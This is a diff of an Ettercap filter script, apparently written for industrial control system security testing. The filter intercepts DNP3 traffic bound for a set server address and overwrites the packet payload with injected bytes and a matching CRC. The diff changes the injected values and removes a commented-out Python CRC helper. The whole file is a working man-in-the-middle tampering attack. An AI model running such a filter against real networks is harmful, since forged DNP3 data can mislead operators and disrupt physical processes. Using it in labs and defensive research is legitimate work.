@@ -8,28 +8,19 @@
 # Created by: Don C. Weber (@cutaway)
 # Date Created: November 2022
 # Version: 0.1
-# 
-# Calculating DNP3 CRC using Python
-# import crcmod.predefined
-# crcdnp = crcmod.predefined.mkCrcFun('crc-16-dnp')
-# data = '01010101010101010101010101010101'
-# hex(crcdnp(bytes.fromhex(data)))
-# '0xc3bb' <- Output. Flip these bytes to little-endian for the packet data '\xbb\xc3' 
-#
 ###########################################
 
 # Checking to see if the destination is the server and the protocol is DNP3
 # Note: The IP address will need to be updated for your server
+
 if (ip.dst == '192.168.0.21') {
     if (tcp.src == 20000) {
-
-        # Check for DNP3 message and a DNP3 data with length 37. 
+        # Check for DNP3 message and a DNP3 data with length 101 and Control Byte is 0x44. 
         if (DATA.data == "\x05\x64\x65\x44"){
             # Overwrite DNP3 packet data
-            DATA.data + 28 = "\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\xbb\xc3";
+            DATA.data + 28 = "\xaa\xaa\x01\xaa\xaa\x01\xaa\xaa\x01\xaa\xaa\x01\xaa\xaa\x01\xaa\xa9\xb6";
             # Printing a message when the filter fires.
-            msg("Updated DNP3 data with \x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\xbb\xc3");
+            msg("Updated DNP3 data with 0xaaaa01aaaa01aaaa01aaaa01aaaa01aaa9b6");
         }
     }
 }
-
